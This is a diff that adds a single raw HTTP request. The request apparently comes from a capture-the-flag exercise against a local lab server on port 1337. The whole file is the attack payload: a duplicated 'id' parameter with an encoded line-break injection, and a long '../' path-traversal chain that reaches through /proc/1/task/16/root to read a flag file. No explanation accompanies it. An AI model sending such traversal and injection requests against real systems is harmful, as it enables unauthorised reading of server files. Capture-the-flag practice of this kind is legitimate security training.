@@ -1,0 +1,10 @@
+GET /api/team?id=1%0d%a&id=../../../../../../../../../../../../../../../../../../../../../../../../../../../proc/1/task/16/root/flag.txt HTTP/1.1
+Host: 192.168.86.46:1337
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://192.168.86.46:1337/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
